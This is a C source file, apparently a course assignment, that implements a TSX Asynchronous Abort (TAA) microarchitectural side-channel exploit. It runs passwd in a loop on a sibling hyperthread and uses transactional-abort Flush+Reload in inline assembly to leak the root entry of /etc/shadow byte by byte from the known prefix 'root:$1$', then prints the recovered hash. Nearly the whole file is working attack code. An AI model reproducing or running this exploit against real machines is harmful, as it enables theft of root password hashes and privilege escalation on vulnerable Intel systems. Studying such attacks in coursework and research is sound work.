#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <assert.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <ctype.h>
#include <pthread.h>
#include <signal.h>
#include <byteswap.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <ctype.h>
#include "asm.h"
#include <x86intrin.h>

#define CACHE_THRESHOLD 100
#define EXPONENT 12
#define STRIDE (1 << EXPONENT)
#define STEP_SIZE 1

// ASCII printable characters.
#define N_CHARS 256
#define RELOADBUFFER_SIZE (N_CHARS * STRIDE)
#define ASCII_PRINTABLE_START 0x20
#define CACHEHITS_SIZE (N_CHARS * sizeof(uint32_t) * 2)

#define DEBUG_SWITCH 0
#define DONTNEED_SWITCH 1

#define SHADOW_START "root:$1$"

// TODO: it is a very big number just because we exit early
uint32_t iterations = 1000000;
// uint32_t iterations = 30000;
uint32_t reload_signal_thres;

unsigned char *reloadbuffer0;
void *leakbuffer;
uint32_t *cache_hits;
uint32_t *cache_hits0;

int* get_affinity(uint8_t* count) {
    // expect no more than 64 CPUs.
    static int cpu_list[64];
    cpu_set_t mask;
    CPU_ZERO(&mask);

    if (sched_getaffinity(0, sizeof(mask), &mask) == -1) {
        perror("sched_getaffinity");
        return NULL;
    }

    uint8_t cpu_count = 0;
    for (int i = 0; i < sizeof(cpu_set_t) * 8 && cpu_count < 64; i++) {
        if (CPU_ISSET(i, &mask)) {
            cpu_list[cpu_count++] = i;
        }
    }

    *count = cpu_count;
    return cpu_list;
}

void set_affinity(int cpu) {
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);
    if (sched_setaffinity(0, sizeof(mask), &mask) == -1) {
        perror("sched_setaffinity");
        exit(1);
    }
}

size_t access_time(void *addr) {
    mfence();
    uint64_t s = rdtscp();
    *(volatile char *)addr;
    return rdtscp() - s;
}

void flush_buffer() {
    // micro optimization: use sum instead of multiplication
    for (int j = 0x20 * STRIDE; j <= 0x7f * STRIDE; j += STRIDE) {
        clflush(reloadbuffer0 + j);
    }
}

void reload_buffer() {
    for (int i = 0; i < 256; i++) {
        int index = ((i * 7) + 13) & 255;
        if (isprint(index)) {
            if (access_time(reloadbuffer0 + index * STRIDE) <= CACHE_THRESHOLD) {
                cache_hits0[index] += 1;
            }
        }
    }
}

void update_values_ascii(uint32_t *hits, uint32_t *max_hits, uint32_t *argmax_hits) {
    for (int i = 0x20; i <= 0x7E; i++) {
        if (DEBUG_SWITCH) {
            printf("cache_hits[%d]: %d\n", i, hits[i]);
        }
        if (hits[i] > *max_hits) {
            *max_hits = hits[i];
            *argmax_hits = i;
        }
    }
}

void init_data_structures() {
    reloadbuffer0 = mmap(NULL, RELOADBUFFER_SIZE, PROT_READ | PROT_WRITE, 
        MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE|MAP_HUGETLB|21<<MAP_HUGE_SHIFT, -1, 0);

    if (reloadbuffer0 == MAP_FAILED) {
        perror("mmap\n");
        exit(-1);
    }
    memset(reloadbuffer0, 0, RELOADBUFFER_SIZE - 1);


    cache_hits = malloc(CACHEHITS_SIZE);
    if (!cache_hits) {
        perror("malloc\n");
        exit(-1);
    }
    cache_hits0 = cache_hits;

    leakbuffer = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (leakbuffer == MAP_FAILED) {
        perror("mmap\n");
        exit(-1);
    }
}

inline __attribute__((always_inline)) void __call_passwd(char *const argv[]) {
    if (fork() == 0) {
        int devnull = open("/dev/null", O_WRONLY);
        dup2(devnull, 1);
        dup2(devnull, 2);
        execv("/usr/bin/passwd", argv);
        exit(1);
    }
    wait(NULL);
}

void call_passwd() {
    char *const args[] = {"passwd", "-S", getenv("USER"), NULL};
    __call_passwd(args);
}

pid_t child_pid0 = 0;

// ensure both programs run on distinct hyperthreads as per the assignment.
static pid_t set_affinity_call_passwd() {

    uint8_t cpu_count = 0;
    int* affinity = get_affinity(&cpu_count);

    if (cpu_count < 2) {
        perror("cpu affinity < 2");
        exit(1);
    }

    child_pid0 = fork();
    if (child_pid0 == 0) {
        set_affinity(affinity[1]);
        while (1) { call_passwd(); }
    }
    else {
        set_affinity(affinity[0]);
    }
    return child_pid0;
}

inline __attribute__((always_inline)) void taa(void *leak_addr, const unsigned int exp) {
	asm volatile(
	"clflush (%0)\n"
    "sfence\n"
	"clflush (%1)\n"
	"xbegin 1f\n"
	"movzbq 0x0(%0), %%rax\n"       // trigger transaction abort, but instructions continue.
	"shl %%cl, %%rax\n"
	"movzbq (%%rax, %1), %%rax\n"   // reloadbuffer access.
	"xend\n"
	"1:\n"
	::"r"(leak_addr), "r"(reloadbuffer0), "c"(exp) : "rax"
	);
}

inline __attribute__((always_inline)) void taa_k7_l1(void *leak_addr, const unsigned int exp, register uint64_t known_prefix) {
	asm volatile(
	"clflush (%0)\n"
    "sfence\n"
	"clflush (%1)\n"
	"xbegin 1f\n"
	"movq (%0), %%rax\n"            // trigger transaction abort, but instructions continue.
    "xorq %3, %%rax\n"              // this should ensure all "known" bytes are zeroed, but the first one aint.
	"rol %%cl, %%rax\n"             // roll left by exp + 8 because we mask the 7 rightmost bytes, the exponent is used as stride.
	"movzbq (%%rax, %1), %%rax\n"   // reloadbuffer access.
	"xend\n"
	"1:\n"
	::"r"(leak_addr), "r"(reloadbuffer0), "c"(exp+8), "r"(known_prefix)
    : "rax"
	);
}


inline __attribute__((always_inline)) void leak_secret_bytes(char *leaked_secret, int start, int end, int iterations, 
    const unsigned int reload_signal_threshold, int step_size) {
    
    // TODO: Ensure we detect end of password and break at that point.
    uint8_t count_colons = 1;
    uint32_t iteration = 0;
    for (int index = start; index < end; index += step_size) {
        if (count_colons == 8) {
            leaked_secret[index] = 0;
            break;
        }

        memset(cache_hits, 0, CACHEHITS_SIZE);

        uint32_t max_hits0 = 0;
        uint32_t argmax_hits0 = 0;

        register uint64_t known_prefix = 0;
        known_prefix = *((uint64_t *)&leaked_secret[index - 7]) & 0x00ffffffffffffff;

        if (DONTNEED_SWITCH) {
            madvise(leakbuffer, 0x1000, MADV_DONTNEED);
        }
        iteration = 0;
        while (1) {

            flush_buffer();
            taa_k7_l1(leakbuffer + (index - 7), EXPONENT, known_prefix);
            asm volatile("mfence\n");
            reload_buffer();

            // micro optimization: early exit
            if (iteration % 3000 == 0) {
                update_values_ascii(cache_hits0, &max_hits0, &argmax_hits0);
                if (max_hits0 >= reload_signal_threshold) {
                    break;
                }
            }

            iteration++;
        }
        printf("[*] found at index=%d: %c, hits: %d, iteration: %d.\n", index, argmax_hits0, max_hits0, iteration);
        leaked_secret[index] = argmax_hits0;
        if (argmax_hits0 == ':') {
            count_colons += 1;
        }

    }
}

// TODO potential: currently we're only using 1/4 core pairs. we can speed up probably with pthreads.
int main(int argc, char *argv[]) {
    if (argc > 1) {
        iterations = atoi(argv[1]);
    }
    reload_signal_thres = 2; //iterations/5;
    init_data_structures();
    pid_t child_pid = set_affinity_call_passwd();

    char leaked_secret[64 + 1];
    memcpy(leaked_secret, SHADOW_START, strlen(SHADOW_START));

    leak_secret_bytes(leaked_secret, 7, 64, iterations, reload_signal_thres, STEP_SIZE);

    printf("%s\n", leaked_secret);

    munmap(reloadbuffer0, RELOADBUFFER_SIZE);
    free(cache_hits);

    kill(child_pid0, SIGKILL);

    return 0;
}
